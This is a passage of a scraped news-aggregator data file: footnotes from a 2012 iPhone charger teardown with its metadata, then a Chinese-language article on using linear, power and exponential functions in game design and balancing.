don&#39;t want, send it to me and maybe I&#39;ll write up a detailed teardown of it. Also see comments on  Hacker News.  [1]You might wonder why the DC voltage inside the power supply is so much higher than the line voltage. The DC voltage is approximately sqrt(2) times the AC voltage, since the diode charges the capacitor to the peak of the AC signal. Thus, the input of 100 to 240 volts AC is converted to a DC voltage of 145 to 345 volts internally. This isn&#39;t enough to be officially  high voltage but I&#39;ll call it high voltage for convenience. According to standards, anything under 50 volts AC or 120 V dc is considered  extra-low voltage and is considered safe under normal conditions. But I&#39;ll refer to the 5V output as low voltage for convenience. [2]The Apple power supply uses a flyback design, where the transformer operates &#34;backwards&#34; from how you might expect. When a voltage pulse is sent into the transformer, the output diode blocks the output so there is no output - instead a magnetic field builds up. When the voltage input stops, the magnetic field collapses causing voltage output from the transformer. Flyback power supplies are very common for low-wattage power supplies. [3]The primary board measures about 22.5mm by 20.0mm, while the secondary board is about 22.2mm by 20.2mm. [4]For more information on X and Y capacitors, see  Kemet&#39;s presentation and  Designing low leakage current power supplies. [5]For clarity, some insulation was removed before taking the pictures in this article. The Y capacitor was covered with black heat shrink tubing, there was tape around the side of the circuit, the fusible resistor was covered with black heat shrink tubing, and there was a black insulating cover over the USB connector. [6]Snubber circuits can be used to reduce 60 Hz hum generated by the diode bridge in audio power supplies. A detailed reference on R-C snubbers for audio power supply diodes is  Calculating Optimum Snubbers, and a sample design is  An Audio Amplifier Power Supply Design. [7]The power supply is controlled by the L6565 quasi-resonant SMPS (switched-mode power supply) controller chip ( datasheet). (To be sure, the chip could be something else, but the circuit exactly matches the L6565 and no other chip I examined.) To improve efficiency and reduce interference, the chip uses a technique known as quasi-resonance, which was first developed in the 1980s. The output circuit is designed so when the power is switched off, the transformer voltage will oscillate. When the voltage hits zero, the transistor switches back on. This is known as Zero Voltage Switching because the transistor is switched when there is essentially no voltage across it, minimizing waste\n......", "posttime": "2021-08-05 20:58:01", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u82f9\u679c,iphone,apple,\u5145\u7535\u5668", "title": "\u82f9\u679c iPhone \u5145\u7535\u5668\u62c6\u89e3\uff1a\u5c0f\u800c\u6602\u8d35\u7684\u5305\u88c5\u4e2d\u7684\u8d28\u91cf\uff082012\uff09", "title_en": "Apple iPhone charger teardown: quality in a tiny expensive package (2012)", "transed": 1, "url": "http://www.righto.com/2012/05/apple-iphone-charger-teardown-quality.html", "via": "", "real_tags": ["\u82f9\u679c", "iphone", "apple", "\u5145\u7535\u5668"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1071345, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u65e0\u8bba\u60a8\u7684\u6e38\u620f\u662f\u5426\u5c06\u5176\u6570\u5b57\u663e\u793a\u7ed9\u73a9\u5bb6\uff0c\u5f88\u53ef\u80fd\u5b83\u90fd\u6709\u4f9d\u8d56\u5b83\u4eec\u7684\u5e95\u5c42\u7cfb\u7edf\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u51fd\u6570\u6765\u786e\u5b9a\u8fd9\u4e9b\u6570\u5b57\u5982\u4f55\u76f8\u4e92\u5f71\u54cd\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u6570\u5b66\u51fd\u6570\u901a\u5e38\u662f\u4e00\u7cfb\u5217\u5e38\u89c1\u6e38\u620f\u8bbe\u8ba1\u95ee\u9898\u7684\u6838\u5fc3\u7b54\u6848\u3002\u6309\u4f4f\u51b2\u523a\u6309\u94ae\u65f6\uff0c\u73a9\u5bb6\u89d2\u8272\u7684\u901f\u5ea6\u5982\u4f55\u53d8\u5316\uff1f\u7b49\u7b49\u3002\u6709\u65f6\u8fd9\u4e9b\u95ee\u9898\u4e0e\u660e\u786e\u7684\u6570\u5b66\u57fa\u7840\u6e38\u620f\u89c4\u5219\u6709\u5173\uff1b\u6709\u65f6\u5b83\u4eec\u66f4\u591a\u5730\u662f\u5173\u4e8e\u5206\u6790\u548c\u610f\u56fe\uff0c\u5173\u4e8e\u4f60\u6b63\u5728\u6784\u5efa\u7684\u7535\u5b50\u8868\u683c\uff0c\u4ee5\u540e\u4f1a\u53d8\u6210\u6e38\u620f\u5c06\u4ee5\u5176\u4ed6\u65b9\u5f0f\u8868\u8fbe\u7684\u6218\u5229\u54c1\u6216\u8fdb\u5ea6\u8868\u3002\u8fd9\u5e76\u4e0d\u610f\u5473\u7740\u4f5c\u4e3a\u8fd9\u4e9b\u529f\u80fd\u7684\u5168\u9762\u5165\u95e8\uff0c\u66f4\u4e0d\u7528\u8bf4\u67d0\u79cd\u5206\u7c7b\u6cd5\u4e86\u3002\u5b83\u66f4\u50cf\u662f\u4e00\u7ec4\u6709\u8da3\u7684\u6837\u672c\uff0c\u4ee5\u53ca\u5386\u53f2\u3001\u7528\u4f8b\u548c\u5bf9\u5176\u884c\u4e3a\u7684\u89c2\u5bdf\u3002\u8ba9\u6211\u4eec\u9996\u5148\u901a\u8fc7\u8ba8\u8bba\u6700\u7b80\u5355\u7684\u51fd\u6570\\(f(x) = bx + a\\) \u6765\u5efa\u7acb\u57fa\u7ebf\u3002\u8fd9\u6709\u52a9\u4e8e\u6307\u51fa\u53c2\u6570\u5316\u7684\u57fa\u7840\u2014\u2014\u901a\u8fc7\u8c03\u6574\\(b\\)\uff0c\u6211\u4eec\u53ef\u4ee5\u6539\u53d8\u51fd\u6570\u7684\u659c\u7387\uff0c\u4f7f\u5176\u66f4\u9661\u6216\u66f4\u6d45\uff1b\u901a\u8fc7\u8c03\u6574 \\(a\\) \u6211\u4eec\u53ef\u4ee5\u5c06\u8f93\u51fa\u5411\u4e0a\u6216\u5411\u4e0b\u79fb\u52a8\u4e00\u5b9a\u91cf\u3002\u4f7f\u7528\u7ebf\u6027\u66f2\u7ebf\u7684\u4e3b\u8981\u539f\u56e0\u662f\u7b80\u5355\u660e\u4e86\u3002\u73a9\u5bb6\u53ef\u4ee5\u975e\u5e38\u76f4\u89c2\u5730\u638c\u63e1\u7ebf\u6027\u7cfb\u7edf\uff0c\u8fd9\u4e9b\u51fd\u6570\u5c06\u4fdd\u6301\u73a9\u5bb6\u671f\u671b\u7684\u51e0\u4e2a\u5c5e\u6027\u3002\u4f8b\u5982\uff0c\u5982\u679c\u4f60\u52a0\u500d \\(x\\)\uff0c\u90a3\u4e48 \\(f(x)\\) \u4e5f\u4f1a\u52a0\u500d\u3002\u5982\u679c\u5c06 \\(x\\) \u589e\u52a0\u67d0\u4e2a\u503c \\(y\\)\uff0c\u90a3\u4e48\u65e0\u8bba \\(x\\) \u662f\u591a\u5c11\uff0c\\(f(x)\\) \u90fd\u4f1a\u589e\u52a0\u76f8\u540c\u7684\u6570\u91cf\u3002\u8fd9\u79cd\u6e05\u6670\u5ea6\u5bf9\u4e8e\u8bd5\u56fe\u4f18\u5316\u67d0\u4e9b\u4e1c\u897f\u7684\u73a9\u5bb6\u6765\u8bf4\u662f\u65e0\u4ef7\u7684\u3002\u5f53\u7136\uff0c\u8fd9\u79cd\u7b80\u5355\u6027\u6392\u9664\u4e86\u66f4\u590d\u6742\u7684\u884c\u4e3a\u3002\u5728\u5f88\u591a\u6e38\u620f\u7cfb\u7edf\u4e2d\uff0c\u73a9\u5bb6\u4e0d\u4f1a\u610f\u8bc6\u5230\u6f5c\u5728\u7684\u6570\u5b57\uff0c\u800c\u662f\u901a\u8fc7\u201c\u611f\u89c9\u201d\u6765\u4e86\u89e3\u7cfb\u7edf\u662f\u5982\u4f55\u5de5\u4f5c\u7684\u2014\u2014\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u4f7f\u7528\u6613\u4e8e\u638c\u63e1\u7684\u7ebf\u6027\u51fd\u6570\u5bf9\u73a9\u5bb6\u6765\u8bf4\u751a\u81f3\u53ef\u80fd\u4e0d\u518d\u6e05\u6670\u6839\u672c\u3002\u5f53\u7136\uff0c\u6709\u65f6\u6211\u4eec\u4e0d\u5e0c\u671b\u6e38\u620f\u7cfb\u7edf\u7acb\u5373\u6e05\u6670\u3002\n\u5e42\u51fd\u6570\u6709\u51e0\u4e2a\u201c\u65cf\u201d\uff0c\u4f46\u9996\u5148\u6211\u4eec\u5e94\u8be5\u8ba8\u8bba \\(f(x) = x^b\\)\uff0c\u5176\u4e2d \\(b\\) \u662f\u4e00\u4e9b\u5927\u4e8e 1 \u7684\u5c0f\u8ba1\u6570\uff0c\u4f8b\u5982 2\u30013 \u62164. \u5e42\u51fd\u6570\u5728\\(0 \\leq x \\leq 1 \\) \u8303\u56f4\u5185\u7684\u201c\u611f\u89c9\u201d\u4e0e\u5728\\(x \\gt 1\\) \u8303\u56f4\u5185\u7684\u60c5\u51b5\u5927\u4e0d\u76f8\u540c\u3002\u5728\u5355\u4f4d\u6b63\u65b9\u5f62\u5185\uff0c\u5b83\u4eec\u201c\u51f8\u51fa\u201d\u5e76\u8fdc\u79bb\u7ebf\u6027\u51fd\u6570\uff0c\u5728 0 \u548c 1 \u70b9\u76f8\u9047\u3002\u5728\u90a3\u4e2a\u6b63\u65b9\u5f62\u4e4b\u5916\uff0c\\(f_{\\mathrm{linear}}(x) \\lt f_{\\mathrm{quadratic}}(x)\\)\uff0c\u659c\u7387\u589e\u52a0\u5230\u65e0\u7a77\u5927\u3002\u5982\u679c\u60a8\u671f\u671b\u6807\u51c6\u5316\u8f93\u5165\uff0c\u5176\u4e2d \\(0 \\leq x \\leq 1\\)\uff0c\u5219\u5e42\u51fd\u6570\u901a\u5e38\u7528\u4e8e\u4e3a\u52a8\u753b\u6216\u89d2\u8272\u8fd0\u52a8\u6dfb\u52a0\u201c\u679c\u6c41\u201d\uff0c\u4f5c\u4e3a\u7f13\u52a8\u51fd\u6570\u7b49\u3002 \\(x \\gt 1\\) \u5728\u8bbe\u8ba1\u7cfb\u7edf\u65f6\u66f4\u6709\u8da3\u7684\u201c\u5916\u90e8\u201d\u8303\u56f4\u3002\u529b\u91cf\u51fd\u6570\u8ba9\u4f60\u52a0\u901f\u6210\u957f\uff0c\u8fd9\u5bf9\u73a9\u5bb6\u6765\u8bf4\u611f\u89c9\u5f88\u5f3a\u5927\uff0c\u5b9e\u9645\u4e0a\uff0c\u8fd9\u672c\u8eab\u5c31\u5f88\u5371\u9669\u3002\u5047\u8bbe\u73a9\u5bb6\u89d2\u8272\u7684\u4f24\u5bb3\u548c\u654c\u4eba\u751f\u547d\u503c\u90fd\u968f\u7740\u4ed6\u4eec\u7684\u7b49\u7ea7\u5448\u6307\u6570\u589e\u957f\uff1b\u8bf4 \\(f_\\mathrm{damage}(x_\\mathrm{level}) = x_\\mathrm{level}^2\\)\u3002\u5728\u5b9e\u8df5\u4e2d\uff0c\u5982\u679c\u73a9\u5bb6\u4e0e\u654c\u4eba\u5904\u4e8e\u540c\u4e00\u7ea7\u522b\uff0c\u5219\u6e38\u620f\u4f1a\u4fdd\u6301\u76f8\u540c\u7684\u5e73\u8861\uff0c\u4f46\u6570\u5b57\u4f1a\u7206\u70b8\u6027\u589e\u957f\u3002\u4f17\u6240\u5468\u77e5\uff0c\u5f53\u6570\u5b57\u5927\u65f6\uff0c\u73a9\u5bb6\u4f1a\u9ad8\u5174\uff1b\u8fd9\u5bf9\u4e8e\u5177\u6709\u53ef\u89c1\u635f\u574f\u6570\u5b57\u7684\u6e38\u620f\u6765\u8bf4\u6548\u679c\u5f88\u597d\u3002\u4f46\u662f\uff0c\u968f\u7740\u73a9\u5bb6\u7b49\u7ea7\u7684\u63d0\u9ad8\uff0c\u6bcf\u4e2a\u540e\u7eed\u7ea7\u522b\u7684\u91cd\u8981\u6027\u90fd\u4f1a\u6709\u6240\u964d\u4f4e\u3002\u4f60\u53ef\u4ee5\u901a\u8fc7\u67e5\u770b \\(\\frac{f(x)}{f(x) + 1}\\) \u7684\u56fe\u8868\u6765\u7406\u89e3\u4e3a\u4ec0\u4e48\uff1a\u4e00\u4e2a 1 \u7ea7\u73a9\u5bb6\u4e0e 2 \u7ea7\u654c\u4eba\u6218\u6597\u53ef\u80fd\u4f1a\u9020\u6210 25% \u7684\u4f24\u5bb3\uff0c\u800c\u7ea7\u522b 10 \u548c\u7ea7\u522b 11 \u4e4b\u95f4\u7684\u5dee\u5f02\u8fdc\u6ca1\u6709\u90a3\u4e48\u663e\u7740\u3002\u5f53\u7136\uff0c\u5982\u679c x \u603b\u662f\u4e00\u4e2a\u66f4\u5927\u7684\u6574\u6570\uff0c\u8fd9\u51e0\u4e4e\u4e0d\u4f1a\u90a3\u4e48\u660e\u663e\uff0c\u4f46\u5b83\u4ecd\u7136\u5b58\u5728\u3002\n\u4e00\u5207\u90fd\u662f\u76f8\u5bf9\u7684\uff0c\u56e0\u6b64\u589e\u957f\u66f2\u7ebf\u7684\u201c\u611f\u89c9\u201d\u5c06\u53d6\u51b3\u4e8e\u5b83\u4e0e\u4ec0\u4e48\u8fdb\u884c\u6bd4\u8f83\u3002\u4e3a\u4e86\u7528\u529f\u7387\u66f2\u7ebf\u6765\u8bf4\u660e\u8fd9\u4e00\u70b9\uff0c\u8bf7\u8003\u8651\u4e00\u4e2a RPG\uff0c\u5176\u4e2d\uff1a \u968f\u7740\u73a9\u5bb6\u7ea7\u522b\u7684\u589e\u52a0\u5e76\u8fdb\u5165\u66f4\u9ad8\u7ea7\u522b\u7684\u5185\u5bb9\uff0c\u4efb\u52a1\u5956\u52b1\uff08\u91d1\u94b1\uff09\u6309\u4e8c\u6b21\u65b9\u6269\u5c55\uff1b\u6d88\u8017\u54c1\u5f88\u5feb\u53d8\u5f97\u65e0\u9650\uff0c\u81f3\u5c11\u5c31\u91d1\u94b1\u800c\u8a00\u3002\u7ecf\u8fc7\u51e0\u4e2a\u7ea7\u522b\u540e\uff0c\u60a8\u53ef\u4ee5\u6839\u636e\u9700\u8981\u8d2d\u4e70\u4efb\u610f\u6570\u91cf\u7684\u836f\u6c34\u3002\u76f8\u5bf9\u4e8e\u4efb\u52a1\u5956\u52b1\uff0c\u88c5\u5907\u53d8\u5f97\u66f4\u4fbf\u5b9c\uff0c\u5c3d\u7ba1\u9ad8\u7ea7\u88c5\u5907\u4ecd\u7136\u6bd4\u4f4e\u7ea7\u88c5\u5907\u66f4\u6602\u8d35\u3002\u5982\u679c\u53ef\u4ee5\u4e70\u5230\u8d85\u6c34\u5e73\u7684\u8bbe\u5907\uff0c\u5b83\u4f1a\u53d8\u5f97\u8d8a\u6765\u8d8a\u4fbf\u5b9c\u3002\u5982\u679c\u4f60\u5931\u53bb\u4e86\u4e00\u540d\u515a\u5458\uff0c\u4e3a\u4ed6\u4eec\u7684\u590d\u6d3b\u4ed8\u51fa\u7684\u52aa\u529b\u7a0b\u5ea6\u603b\u662f\u5927\u81f4\u76f8\u540c\u7684\u3002\u5f53\u7136\uff0c\u8fd9\u4e9b\u7c7b\u578b\u7684\u5173\u7cfb\u6765\u81ea\u4f7f\u7528\u4efb\u4f55\u51fd\u6570\u5bf9\u4efb\u4f55\u5176\u4ed6\u51fd\u6570\u3002\u67e5\u770b\u6e38\u620f\u4e0d\u540c\u9636\u6bb5\u4e0d\u540c\u529f\u80fd\u4e4b\u95f4\u7684\u6bd4\u4f8b\u975e\u5e38\u6709\u7528\uff0c\u4f7f\u7528\u8fd9\u4e9b\u5173\u7cfb\u5bf9\u4e8e\u5b9e\u73b0\u60a8\u62e5\u6709\u7684\u4efb\u4f55\u73a9\u5bb6\u4f53\u9a8c\u76ee\u6807\u90fd\u975e\u5e38\u91cd\u8981\u3002\u91cd\u65b0\u8003\u8651 \\(f(x) = x^s\\)\uff0c\u6211\u4eec\u663e\u7136\u53ef\u4ee5\u67e5\u770b 2\u30013 \u548c 4 \u4ee5\u5916\u7684\u6307\u6570\u3002\u4f7f\u7528 \\(s\\) \u7684\u503c\u4f5c\u4e3a\u5c0f\u6570\u8fdb\u884c\u5fae\u8c03\u662f\u5f88\u5e38\u89c1\u7684\u66f2\u7ebf\u5e76\u4f7f\u5176\u5b8c\u5168\u7b26\u5408\u9884\u671f\u3002\n\u4f46\u662f\u8fd8\u6709\u53e6\u5916\u4e24\u4e2a\u6709\u7528\u7684\u6848\u4f8b\u3002\u7b2c\u4e00\u4e2a\u662f\u5f53 \\(s\\) \u662f 0 \u5230 1 \u4e4b\u95f4\u7684\u67d0\u4e2a\u5c0f\u6570\u65f6\u3002\u8fd9\u4e9b\u662f\u6536\u76ca\u9012\u51cf\u51fd\u6570\uff0c\u5176\u4e2d\u53d8\u5316\u7387\u968f\u7740 \\(x\\) \u7684\u589e\u52a0\u800c\u51cf\u5c0f\uff0c\u4f46 \\(f(x)\\) \u6c38\u8fdc\u4fdd\u6301\u589e\u52a0.\u8fd9\u79cd\u529f\u80fd\u6709\u5f88\u591a\u5f88\u591a\u7684\u5e94\u7528\u3002\u9996\u5148\uff0c\u5b83\u524d\u7f6e\u52a0\u8f7d\u4e86\\(x\\)\u7684\u6548\u679c\uff1b\u4f60\u53ef\u4ee5\u4ece\u5c11\u91cf\u83b7\u5f97\u6700\u5927\u7684\u597d\u5904\uff0c\u800c\u4e0d\u662f\u5806\u79ef\u5f88\u591a\u3002\u4e00\u4e2a\u5f88\u597d\u7684\u7528\u9014\u53ef\u80fd\u662f\u51cf\u5c11\u4f24\u5bb3\u3002\u5047\u8bbe\u4f60\u53ef\u4ee5\u88c5\u5907\u4e00\u5b9a\u6570\u91cf\u7684 \\(x\\) \u4ef6\u6297\u5bd2\u7269\u54c1\uff0c\u5b83\u4eec\u4e00\u8d77\u53ef\u4ee5\u62b5\u6d88 \\(10x^{0.5}\\) \u4ef6\u5bd2\u51b7\u4f24\u5bb3\u3002\u4f60\u7684\u7b2c\u4e00\u4ef6\u6297\u5bd2\u7269\u54c1\u53ef\u4ee5\u62b5\u6d88 10 \u70b9\u4f24\u5bb3\u3002\u4f46\u662f\u8981\u4f7f\u8fd9\u79cd\u4fdd\u62a4\u52a0\u500d\u5e76\u62b5\u6d88 20 \u70b9\u4f24\u5bb3\uff0c\u60a8\u5fc5\u987b\u5c06\u6240\u88c5\u5907\u7684\u6297\u5bd2\u7269\u54c1\u6570\u91cf\u589e\u52a0\u56db\u500d\u3002\u6234\u4e0a\u53e6\u4e00\u526f\u6e29\u6696\u7684\u8fde\u6307\u624b\u5957\u3001\u4fdd\u6696\u80cc\u5fc3\u6216 Ushanka \u603b\u662f\u4f1a\u589e\u52a0\u73a9\u5bb6\u83b7\u5f97\u7684\u4f24\u5bb3\u51cf\u514d\u91cf\uff0c\u4f46\u62e5\u6709\u4e00\u4e9b\u6bd4\u62e5\u6709\u5f88\u591a\u66f4\u91cd\u8981\u548c\u5f15\u4eba\u6ce8\u76ee\u3002\u6700\u540e\uff0c\u6211\u4eec\u6765\u5230\u8d1f\u6743\u529b\u3002\u5982\u679c\u60a8\u4e0d\u8bb0\u5f97\u8d1f\u5e42\u662f\u5982\u4f55\u5de5\u4f5c\u7684\uff1a\u5c06\u67d0\u7269\u63d0\u5347\u4e3a\u8d1f\u5e42\u4e0e\u53d6\u6b63\u5e42\u7684\u5012\u6570\u662f\u4e00\u56de\u4e8b\uff1b\u4e5f\u5c31\u662f\u8bf4\uff1a\u540e\u8005\u53ef\u80fd\u66f4\u5bb9\u6613\u63a8\u7406\uff0c\u5e76\u4e14\u8ba1\u7b97\u901f\u5ea6\u53ef\u80fd\u66f4\u5feb\uff0c\u5982\u679c\u8fd9\u5bf9\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u5f88\u91cd\u8981\u3002\u8bf7\u6ce8\u610f\uff0c\u5bf9\u4e8e\u50cf \\(f(x) = x^{-s}\\) \u8fd9\u6837\u7684\u51fd\u6570\uff0c\\(x = 0\\) \u7684\u503c\u662f\u672a\u5b9a\u4e49\u7684\uff0c\u5e76\u4e14\u63a5\u8fd1\u65e0\u7a77\u5927\u3002\u8fd9\u5f80\u5f80\u6ca1\u6709\u7528\uff0c\u6240\u4ee5\u4f60\u901a\u5e38\u4f1a\u4ee5 \\(f(x) = (x + 1)^{-s}\\) \u7684\u5f62\u5f0f\u770b\u5230\u5b83\uff0c\u8fd9\u5c06\u5b83\u6807\u51c6\u5316\uff0c\u4f7f\u5f97 \\(f(0) = 1\\ \uff09\u3002\u60a8\u53ef\u4ee5\u5c06\u5176\u89c6\u4e3a\u7f13\u52a8\u529f\u80fd\uff1b\u5b83\u968f\u7740 \\(x\\) \u7684\u589e\u52a0\u800c\u51cf\u6162\uff0c\u5c3d\u7ba1\u5b83\u6c38\u8fdc\u4e0d\u4f1a\u5b8c\u5168\u7a33\u5b9a\u3002\u6548\u679c\u975e\u5e38\u524d\u7f6e\uff1b\u5728\u4e0a\u56fe\u4e2d\uff0c\\(x\\) \u7684\u7b2c\u4e00\u4e2a\u70b9\u5c06 \\(y\\) \u51cf\u534a\uff0c\u4f46\u968f\u540e\u7684\u70b9\u8fdc\u6ca1\u6709\u90a3\u4e48\u6709\u6548\u3002\u4f46\u662f\u5f53\u6211\u4eec\u5728 4 \u65f6\uff0c\u6548\u679c\u975e\u5e38\u5fae\u5f31\u3002\u6700\u660e\u663e\u7684\u7528\u4f8b\u662f\u4f5c\u4e3a\u5176\u4ed6\u4e1c\u897f\u7684\u4e58\u6570\u6765\u51cf\u5c11\u5b83\u2014\u2014\u6839\u636e\u4ed6\u4eec\u7684\u6613\u8d27\u6280\u80fd\u7ed9\u4e88\u73a9\u5bb6\u6298\u6263\uff0c\u6839\u636e\u4ed6\u4eec\u7684\u76d4\u7532\u51cf\u5c11\u53d7\u5230\u7684\u4f24\u5bb3\uff0c\u7b49\u7b49\u3002\u7531\u4e8e\u5176\u51cf\u901f\u7279\u6027\uff0c\u5b83\u5bf9\u4e8e\u53ef\u4ee5\u53e0\u52a0\u7684\u8d1f\u9762\u6548\u679c\u5f88\u6709\u7528 - \u4f8b\u5982\uff0c\u5728\u73a9\u5bb6\u7d2f\u79ef\u51cf\u76ca\u6548\u679c\u65f6\u964d\u4f4e\u73a9\u5bb6\u7684\u901f\u5ea6\u3002\u540e\u7eed\u7684\u5806\u53e0\u603b\u662f\u4f1a\u4ea7\u751f\u6548\u679c\uff0c\u4f46\u5927\u90e8\u5206\u5f71\u54cd\u6765\u81ea\u7b2c\u4e00\u4e2a\u3002\n\u6307\u6570\u51fd\u6570\\(f(x) = b^x\\)\uff0c\u5176\u4e2d\\(b \\gt 1\\)\u3002\u4e0a\u9762\u663e\u793a\u7684\u662f\\(e^x - 1\\)\u3002\u4e0e\u5e42\u51fd\u6570\u4e00\u6837\uff0c\u6307\u6570\u51fd\u6570\u589e\u957f\u5230\u65e0\u7a77\u5927\u3002\u4e0e\u5e42\u51fd\u6570\u4e0d\u540c\uff0c\u589e\u957f\u7387\u968f\u7740\u4ef7\u503c\u672c\u8eab\u7684\u589e\u957f\u800c\u4e0d\u65ad\u52a0\u901f\uff0c\u56e0\u6b64\u6bcf\u6b21\u589e\u957f\u7684\u76f8\u5bf9\u4e58\u6570\u503c\u4fdd\u6301\u4e0d\u53d8\u3002\u6307\u6570\u589e\u957f\u751a\u81f3\u6bd4\u4e8c\u6b21\u6216\u4e09\u6b21\u589e\u957f\u8fd8\u8981\u5927\uff1b\u5982\u679c\u8fd9\u4e9b\u51fd\u6570\u521b\u5efa\u4e86\u5927\u7684\u3001\u4ee4\u73a9\u5bb6\u6ee1\u610f\u7684\u6570\u5b57\uff0c\u90a3\u4e48\u6307\u6570\u51fd\u6570\u5f88\u53ef\u80fd\u4f1a\u521b\u5efa\u66f4\u5927\u7684\u6570\u5b57\u3002\u5728\u4ee5\u4e0b\u60c5\u51b5\u4e0b\u4f7f\u7528\u6307\u6570\u51fd\u6570\u53ef\u80fd\u6709\u610f\u4e49\uff1a \u60a8\u5e0c\u671b\u6570\u5b57\u771f\u6b63\u7206\u70b8\u3002\u4e5f\u8bb8\u60a8\u5c06\u5b83\u4eec\u66b4\u9732\u7ed9\u73a9\u5bb6\uff0c\u800c\u60a8\u7684\u6e38\u620f\u5c31\u662f\u770b\u5230\u90a3\u4e00\u5927\u5806\u96f6\u3002\u4e5f\u8bb8\u60a8\u7684\u6e38\u620f\u6d89\u53ca\u8303\u56f4\u5e7f\u6cdb\u7684\u97f3\u9636\u3002\u4e5f\u8bb8\u8f93\u5165\u7684\u8303\u56f4\u5f88\u5c0f\uff0c\u4f46\u60a8\u5e0c\u671b\u8fd9\u4e2a\u5c0f\u8303\u56f4\u8f6c\u5316\u4e3a\u8f93\u51fa\u7684\u5de8\u5927\u53d8\u5316\u3002\u793a\u4f8b\uff1a\u4e00\u4e2a\u6ed1\u7a3d\u7684\u7269\u7406\u9a71\u52a8\u7684\u9ad8\u5c14\u592b\u6e38\u620f\uff0c\u5176\u4e2d\u7684\u7b11\u8bdd\u662f 9 \u53f7\u94c1\u6746\u6bd4 0 \u53f7\u94c1\u6746\u5c04\u51fa\u7684\u7403\u591a \\(2^9\\) \u500d\u3002\u4f60\u60f3\u8981\u4e58\u6cd5\u4e00\u81f4\u6027\uff1b\u4e5f\u5c31\u662f\u589e\u52a0\u8f93\u5165\u7684\u7edd\u5bf9\u589e\u5e45\u4f1a\u589e\u52a0\uff0c\u4f46\u662f10\u7ea7\u548c11\u7ea7\u7684\u6bd4\u4f8b\u548c1\u7ea7\u548c2\u7ea7\u7684\u6bd4\u4f8b\u662f\u4e00\u6837\u7684\u3002\u4f60\u4e0d\u7528\u62c5\u5fc3\u6e38\u620f\u5e73\u8861\uff0c\u8981\u4e48\u662f\u56e0\u4e3a\u8f93\u5165\u8be5\u51fd\u6570\u662f\u4e25\u683c\u6709\u754c\u7684\uff0c\u6216\u8005\u56e0\u4e3a\u60a8\u6839\u672c\u4e0d\u5728\u4e4e\u3002\u793a\u4f8b\uff1a\u73a9\u5bb6\u751f\u547d\u503c\u589e\u957f\u5448\u6307\u6570\u589e\u957f\uff0c\u4f46\u57fa\u6570\u5f88\u5c0f\u4e14\u6e38\u620f\u6709\u7b49\u7ea7\u4e0a\u9650\uff0c\u56e0\u6b64\u6211\u4eec\u77e5\u9053\u6700\u5c0f\u503c\u548c\u6700\u5927\u503c\u662f\u591a\u5c11\u3002\u793a\u4f8b\uff1a\u518d\u6b21\uff0c\u4e00\u4e2a\u95f2\u7f6e\u6e38\u620f\uff0c\u5176\u4e2d\u7684\u7b11\u8bdd\u662f\u6570\u5b57\u7206\u70b8\u5e76\u4e14\u662f\u65e0\u9650\u7684\uff0c\u76f4\u5230\u6e38\u620f\u672c\u8eab\u4e2d\u65ad\u3002\n\u8bf7\u8bb0\u4f4f\uff0c\u867d\u7136\u6307\u6570\u66f2\u7ebf\u901a\u5e38\u770b\u8d77\u6765\u50cf\u975e\u5e38\u5c16\u9510\u7684\u201c\u66f2\u68cd\u7403\u68d2\u201d\u66f2\u7ebf\uff0c\u4f46\u60a8\u53ef\u4ee5\u62e5\u6709\u8f83\u6d45\u7684\u6307\u6570\u66f2\u7ebf\uff01\u53ea\u9700\u4f7f\u7528\u7565\u9ad8\u4e8e 1 \u7684\u57fa\u6570\u3002\u5047\u8bbe\u60a8\u6839\u636e\u73a9\u5bb6\u7684\u7b49\u7ea7\u5bf9\u4ed6\u4eec\u7684\u751f\u547d\u503c\u4f7f\u7528\u6307\u6570\u7f29\u653e\uff0c\u800c\u60a8\u7684\u6e38\u620f\u4e0a\u9650\u4e3a 20 \u7ea7\u3002\u60a8\u53ef\u4ee5\u5b9a\u4e49\u4e00\u4e2a\u51fd\u6570\uff0c\u5982 \\(f(x) = 8 \\times 1.25^x\\)\u3002\u8fd9\u5bfc\u81f4\u6570\u5b57\u611f\u89c9\u76f8\u5bf9\u5408\u7406\u2014\u2014\u73a9\u5bb6\u4ece 1 \u7ea7\u5f00\u59cb\u65f6\u6709 10 \u70b9\u751f\u547d\u503c\uff0c\u5728 20 \u7ea7\u65f6\u5c06\u6709\u8fd1 700 \u70b9\u2014\u2014\u4f46\u5728\u4fdd\u6301\u76f8\u5bf9\u589e\u957f\u7684\u540c\u65f6\uff0c\u7edd\u5bf9\u503c\u4ecd\u7136\u8fc5\u901f\u589e\u52a0\u3002\u6307\u6570\u51fd\u6570\u4e5f\u53ef\u4ee5\u975e\u5e38\u76f4\u89c2\u3002\u4e0a\u9762\u7684 \\(8 \\times 1.25^x\\) \u793a\u4f8b\u672c\u8d28\u4e0a\u662f\u201c0 \u7ea7\u65f6 8 \u70b9\u751f\u547d\u503c\uff0c\u6bcf\u7ea7\u589e\u52a0 25%\u201d\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u8fd9\u6bd4\u4e8c\u6b21\u51fd\u6570\u66f4\u5bb9\u6613\u8ba9\u73a9\u5bb6\u7406\u89e3\u3002\u5f53\u60a8\u5c06\u6570\u5b57\u76f4\u63a5\u6216\u95f4\u63a5\u5730\u901a\u8fc7\u8bf8\u5982\u957f\u5ea6\u589e\u957f\u7684\u6761\u5f62\u4e4b\u7c7b\u7684\u4e1c\u897f\u5411\u73a9\u5bb6\u5c55\u793a\u65f6\uff0c\u4e00\u4e2a\u6709\u7528\u7684\u611f\u77e5\u6280\u5de7\u662f\u4f7f\u6bcf\u4e2a\u7edd\u5bf9\u589e\u91cf\u5927\u4e8e\u4e0a\u4e00\u4e2a\u589e\u91cf\uff0c\u8ba9\u73a9\u5bb6\u611f\u89c9\u5230\u529b\u91cf\u4e0a\u5347\uff0c\u540c\u65f6\u4fdd\u6301\u4ed6\u4eec\u7684\u76f8\u5bf9\u8fb9\u9645\u4ef7\u503c\u3002\u6307\u6570\u51fd\u6570\u5c31\u662f\u8fd9\u6837\u505a\u7684\u3002\u4e0e\u6307\u6570\u589e\u957f\u66f2\u7ebf\u76f8\u8fd1\u7684\u662f\u6307\u6570\u8870\u51cf\u66f2\u7ebf